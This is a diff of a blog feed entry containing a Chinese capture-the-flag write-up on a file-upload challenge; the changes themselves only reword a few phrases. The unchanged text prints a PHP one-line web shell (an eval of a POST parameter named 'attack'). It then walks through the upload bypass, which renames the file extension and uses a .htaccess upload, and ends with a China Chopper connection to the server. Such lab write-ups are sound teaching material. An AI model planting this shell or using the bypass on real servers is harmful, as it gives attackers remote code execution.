@@ -23,9 +23,9 @@
             <description><![CDATA[ &lt;p&gt;涉及到.htaccess&lt;br /&gt;
 &lt;a id=&#34;more&#34;&gt;&lt;/a&gt;&lt;br /&gt;
 &lt;img data-src=&#34;https://i.loli.net/2021/02/21/vU6IVNDxcr9YHbm.png&#34; alt=&#34;&#34; title=&#34;一目了然&#34; /&gt;&lt;br /&gt;
- 就是要我们上传一个 php 一句话木马&lt;/p&gt;
+ 就是要我们上传一句话木马&lt;/p&gt;
 &lt;h2 id=&#34;解题思路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解题思路&#34;&gt;#&lt;/a&gt; 解题思路&lt;/h2&gt;
-&lt;p&gt;按照往常一样，我们先写一份一句话木马&lt;/p&gt;
+&lt;p&gt;按照往常一样，我们先写一份 payload&lt;/p&gt;
 &lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?php &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;@eval($_POST[&#39;attack&#39;]) ;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;将文本保存成 jpg 格式的图片，然后抓包上传。&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/02/21/nUXpQqmFbN9jGSe.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
 将 filename 中的 jpg 格式改为 PHP，当作 php 文件解析。&lt;/p&gt;
@@ -44,7 +44,7 @@
 &lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/02/21/oxy4dLInORQwpW8.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
 可以看到.htaccess 文件上传成功。&lt;/p&gt;
 &lt;p&gt;接下来我们只需要将刚刚上传失败的一句话木马再上传一遍即可。&lt;br /&gt;
-&lt;img data-src=&#34;https://i.loli.net/2021/02/21/5c4lN8zYBUqTDmy.png&#34; alt=&#34;&#34; title=&#34;这里不需要该任何东西&#34; /&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://i.loli.net/2021/02/21/5c4lN8zYBUqTDmy.png&#34; alt=&#34;&#34; title=&#34;这里不需要改动什么了&#34; /&gt;&lt;br /&gt;
 &lt;img data-src=&#34;https://i.loli.net/2021/02/21/Pqz34WrG5hLTMAJ.png&#34; alt=&#34;&#34; title=&#34;木马也已经上传成功了&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;最后我们可以用菜刀链接服务器查看目录里藏着 flag 的文件了。&lt;/p&gt;
 &lt;p&gt;菜刀连接，密码为 attack&lt;br /&gt;
